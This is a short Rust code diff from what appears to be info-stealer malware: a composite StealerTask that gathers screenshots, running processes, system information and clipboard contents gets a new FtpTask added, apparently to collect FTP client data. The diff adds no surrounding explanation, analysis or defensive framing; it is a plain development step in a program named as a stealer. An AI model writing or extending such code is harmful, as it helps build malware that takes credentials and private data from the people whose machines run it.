@@ -15,6 +15,7 @@ use crate::screenshot::ScreenshotTask;
 use crate::systeminfo::SystemInfoTask;
 use alloc::sync::Arc;
 use alloc::vec;
+use ftp::FtpTask;
 use tasks::{CompositeTask, Task};
 use utils::path::Path;
 
@@ -31,6 +32,7 @@ impl StealerTask {
                     Arc::new(ProcessesTask),
                     Arc::new(SystemInfoTask),
                     Arc::new(ClipboardTask),
+                    Arc::new(FtpTask::new())
                 ]
             )
         }
